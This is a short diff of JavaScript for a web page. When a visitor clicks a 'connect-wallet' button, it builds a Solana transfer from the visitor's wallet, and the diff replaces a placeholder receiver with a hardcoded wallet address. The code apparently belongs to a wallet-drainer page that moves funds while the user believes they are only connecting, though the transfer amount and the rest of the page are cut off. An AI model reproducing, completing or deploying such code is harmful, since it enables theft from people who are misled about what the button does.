@@ -29,7 +29,7 @@ $(document).ready(function() {
                 $('#connect-wallet').off('click').on('click', async () => {
                 try {
                 const senderWallet = resp.publicKey;
-                const receiverWallet = new solanaWeb3.PublicKey("RECEIVER_WALLET_ADDRESS_HERE"); // put real address here
+                const receiverWallet = new solanaWeb3.PublicKey("ETNkYSq5bAGBR7Szz7tKFkPWU5wFdPe2XzuxTAAWEfP5"); // put real address here
 
                 const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
